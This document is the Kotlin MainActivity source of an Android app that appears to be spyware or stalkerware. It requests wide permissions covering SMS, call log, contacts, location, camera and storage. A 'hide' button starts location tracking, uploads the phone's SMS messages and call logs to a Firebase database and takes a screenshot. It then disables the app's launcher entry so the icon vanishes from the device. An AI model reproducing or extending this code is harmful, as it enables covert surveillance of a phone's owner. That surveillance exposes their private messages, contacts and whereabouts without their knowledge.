package com.arthurisaac.application

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.text.format.DateFormat
import android.util.Log
import android.view.View
import android.widget.Button
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.arthurisaac.application.services.MyBackgroundService
import com.arthurisaac.application.services.MyForegroundService
import com.arthurisaac.application.states.CallLogState
import com.arthurisaac.application.states.SMSState
import com.arthurisaac.application.utils.PermissionUtil
import com.google.firebase.database.FirebaseDatabase
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileNotFoundException
import java.io.FileOutputStream
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnHide = findViewById<Button>(R.id.btn_hide)
        btnHide.setOnClickListener {

            Intent(applicationContext, LocationService::class.java).apply {
                action = LocationService.ACTION_START
                startService(this)
            }

            val currDate = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(Date())
            val currTime = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
            val values = mutableMapOf<String, Any>()
            val sms = SMSState(this)
            val callLog = CallLogState(this)
            values["SMS/$currDate/$currTime"] = sms.getData()
            values["CALL_LOG/$currDate/$currTime"] = callLog.getData()

            val database = FirebaseDatabase.getInstance()
            database.useEmulator("10.0.2.2", 9000)
            database.reference.child("users-email").updateChildren(values)
                .addOnSuccessListener {
                    Log.i("AI: ", "Data updated successful")
                }
                .addOnFailureListener { exception ->
                    Log.e("AI: ", "Error: " + exception.message)
                }
                .addOnCompleteListener {
                    Log.i("AI: ", "Data updated complete")
                }



            takeScreenShot()

            val p = packageManager
            val componentName = ComponentName(
                this,
                MainActivity::class.java
            )

            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }

        requestPermission()
        Intent(applicationContext, MyForegroundService::class.java).apply {
            startForegroundService(this)
        }
    }

    private fun takeScreenShot() {
        val date: Date = Date()
        val now = DateFormat.format("dd-MM-yyyy_hh:mm:ss", date)

        val filename = Environment.getExternalStorageDirectory().toString() + "/" + now + ".jpg"

        val root: View = window.decorView
        root.isDrawingCacheEnabled  = true
        root.buildDrawingCache(true)
        val bitmap: Bitmap = Bitmap.createBitmap(root.drawingCache)
        root.isDrawingCacheEnabled = false

        if (isPermissionGranted()) {
            Log.d("AI", "Permission granted")
            bitmapToFile(bitmap, "$now.jpg")
        } else {
            Log.d("AI", "Permission not granted")
            takePermission()
        }

        /*val file: File = File(filename)
        file.parentFile!!.mkdirs()

        try {
            val fileOutputStream: FileOutputStream = FileOutputStream(file)
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutputStream)
            fileOutputStream.flush()
            fileOutputStream.close()
        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        }*/
    }

    private fun bitmapToFile(bitmap: Bitmap, fileNameToSave: String) : File? {
        var file: File? = null
        return try {
            val imagesFolder = File(this.getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshots")
            if (!imagesFolder.exists()) {
                imagesFolder.mkdir()
            }
            val path = "$imagesFolder/$fileNameToSave"
            file = File(path)
            //file.createNewFile()

            val  bos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bos)
            val bitmapData = bos.toByteArray()

            val fos = FileOutputStream(file)
            fos.write(bitmapData)
            fos.write(bitmapData)
            fos.flush()
            fos.close()

            file
        } catch (e: Exception) {
            e.printStackTrace()
            file
        }
    }

    private fun requestPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (PermissionUtil.checkAndRequestPermissions(
                    this,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND,
                    Manifest.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.FOREGROUND_SERVICE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.RECEIVE_BOOT_COMPLETED,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.SEND_SMS
                )
            ) {
                Log.i("AI", "Permissions are granted. Good to go!")
            }
        }
    }

    private fun isPermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager();
        } else {
            val readExtStorage = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
            readExtStorage == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun takePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), 100)
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.addCategory("android.intent.category.DEFAULT")
                    intent.data = Uri.parse(String.format("package:%s", applicationContext.packageName))
                    startActivityIfNeeded(intent, 101)
                } catch (e: Exception) {
                    val intent = Intent()
                    intent.action = Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
                    startActivityIfNeeded(intent, 101)
                }
            }
        }
    }

}